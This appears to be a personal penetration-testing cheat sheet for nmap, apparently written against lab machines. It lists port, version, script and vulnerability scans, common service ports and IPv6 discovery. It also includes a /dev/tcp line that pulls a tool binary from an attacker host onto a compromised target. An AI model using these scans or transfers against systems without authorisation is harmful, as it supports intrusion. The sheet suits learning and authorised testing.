# 💢 nmap

Tags: #💢
Related to: 
See also: [[nping]], [[ndiff]], [[ncat]]
Previous: [[Information Gathering]], [[Getting Started]]

## Description
Nmap (“Network Mapper”) is a free and open source (license) utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. It was designed to rapidly scan large networks, but works fine against single hosts. Nmap runs on all major computer operating systems, and official binary packages are available for Linux, Windows, and Mac OS X. In addition to the classic command-line Nmap executable, the Nmap suite includes an advanced GUI and results viewer (Zenmap), a flexible data transfer, redirection, and debugging tool (Ncat), a utility for comparing scan results (Ndiff), and a packet generation and response analysis tool (Nping).

Nmap was named “Security Product of the Year” by Linux Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It was even featured in twelve movies, including The Matrix Reloaded, Die Hard 4, Girl With the Dragon Tattoo, and The Bourne Ultimatum.

## Usage Examples

### Fine order to scan new host

	nmap -sC -sV -oA nmap/reddish 10.10.10.94								    // default script & version scan on top 1000 ports
	nmap -p0- -T5 --max-retries 0 -v -oA nmap/reddish-all-ports 10.10.10.94	// all ports quickly; no retries
	nmap -p0- -T5 --max-retries 0 -v -oA nmap/reddish-all-ports 10.10.10.94	// retry on missed ports due to speed/retries
	nmap -p 1880 -sC -sV -oA nmap/reddish-targeted 10.10.10.94				// targeted scan

### Get static binary onto target machine [^1]

	nc -lvnp 80 < nmap						// kali
	cat < /dev/tcp/10.10.16.12/80 > nmap	// target
	chmod +x nmap

### OS / version detection, traceroute, and script scanning
	nmap -A -p0- --min-rate=1000 -Pn 10.10.110.100

### Fastest timing, no retransmission

	nmap -sC -sV -oA nmap/allports-reddish -Pn -p0- -T5 --max-retries 0 -v 10.129.172.204

```
Rarely use this as if it misses the port, it comes back empty.
```

### Ping sweep

	nmap -sn -T4 10.10.110.0/24 -oN active-hosts

### Scan using a specified script

	nmap --script smb-os-discovery.nse -p445 10.10.10.40

### Provide argument to script

	sudo nmap -sN -n --script /usr/share/nmap/scripts/dns-zone-transfer.nse --script-args domain=lightspeedhosting.com,server=NS1.LIGHTSPEEDHOSTING.COM

### Get a comma-separated list of port numbers.
    ports=$(nmap -p0- --min-rate=1000 -T4 10.129.78.66 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)

### Do a default script and version check on those ports, displaying only open (or possibly open) ports.  
	nmap -sC -sV -p$ports 10.129.78.66 --open

### Set round trip time to receive a response from a slow service

	netcat <port>
	nmap <port> --min-rtt-timeout

### Scan top 1,000 TCP Ports

	nmap -sT --top-ports 1000 -v -oG -

### Scan top 1,000 UDP Ports:

	nmap -sU --top-ports 1000 -v -oG -

### Grab banners

	nmap -sV --script=banner scanme.nmap.org

### Sort ports by order of use frequency

	sort -r -k3 /usr/share/nmap/nmap-services

### NSE

#### Search for Microsoft Security Bulletin
	locate ms17-010 | grep.nse$

#### Examine script
	nmap --script-help=smb-vuln-ms17-010.nse
	less /usr/share/nmap/scripts/smb-vuln-ms17-010.nse
	
#### See which NSE category a script is in
	/categories <Enter>	// categories = {"vuln", "safe"}

#### Ways to run a script
	nmap -p 445 --script safe  
	nmap -p 445 --script smb-vuln-ms17-010  
	nmap -p 445 --script smb-vuln-ms17-010.nse

#### Run safe scripts
	nmap -p 445 --script safe -Pn -n -oA blue-safe-scripts 10.129.2.85

#### See all categories scripts can be in
    grep -r categories /usr/share/nmap/scripts/*.nse

#### Print NSE categories
    grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP \".*?\" | sort -u

#### Run scripts whose categories are both vulnerable and safe.
	nmap -p 445 --script "vuln and safe" -Pn -n -oA blue-vuln-and-safe-scripts 10.129.2.85

### Common ports

**Top 20**
80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 3306, 8080, 1723, 111, 995, 993, 5900

**Windows**  
135, 137-139, 445, 3389  
  
**Linux**  
22, 11  
  
Important Services | Ports
-------------------|------
MSSQL|				1433, 1434
Oracle|				1521, 1630
DB2|				50000, 50001
SAP|				3200, 3300
Prostgres|			5432
MariaDB, MySQL|		3306  
Informix|			9088, 9089  
ICS Protocols|		502 (Modbus), 20000 (DNP3), 44818 (Ethernet/IP)

### Additional TCP scans

#### ACK Scan (-sA)

	- Scan through an "established" filter on a router.  
	- Doesn't reliably tell us if a port is open or closed,  
	- but is useful for identifying hosts (network mapping).  
  
####  FIN Scan (-sF)

	- Set FIN bit of all scan packets.
  
#### Null Scan (-sN)

	- Set all control bits to 0.
  
#### Xmas Tree Scan (-sX)

	- Set FIN, PSH, URG, "lighting up the packet like a Christmas tree".
  
#### Maimon Scan (-sM)

	- Set FIN and ACK bits. Useful on some BSD-derived systems.


### IPv6
	nmap -Pn -sV -6 fe80::20c0 -e eth0 --packet-trace

	ping6 -I eth0 ff02::1	Multicast address for all link-local IPv6 nodes.
	ping6 -I eth0 ff02::2	Multicast address for all link-local IPv6 routers.


### Runtime interaction
	p		Turn on packet tracing.  
	v		Increase verbosity.  
	d		Increase debugging level.  
	Shift	Function inverted when pressing p, v, or d.

---

## References

[^1]: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap